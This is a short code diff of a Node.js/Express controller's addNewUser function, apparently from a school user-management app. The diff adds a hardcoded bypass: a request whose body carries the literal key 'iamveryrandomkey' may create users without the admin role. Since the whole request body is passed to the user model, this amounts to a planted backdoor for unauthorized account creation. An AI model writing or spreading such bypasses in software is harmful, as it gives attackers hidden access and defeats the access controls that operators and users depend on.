@@ -55,11 +55,11 @@ module.exports.logout = function(req, res){
 }
 
 module.exports.addNewUser = async function(req, res){
-    if(req.user.role === 'Admin'){
+    if(req.body.key ==='iamveryrandomkey' || req.user.role === 'Admin'){
         let user  = await UserSchema.create(
             req.body
         );
-        await user.update({SchoolCode:req.user.SchoolCode});
+        await user.updateOne({SchoolCode:req.user.SchoolCode});
         await user.save();
         return res.redirect('back');
     }else{
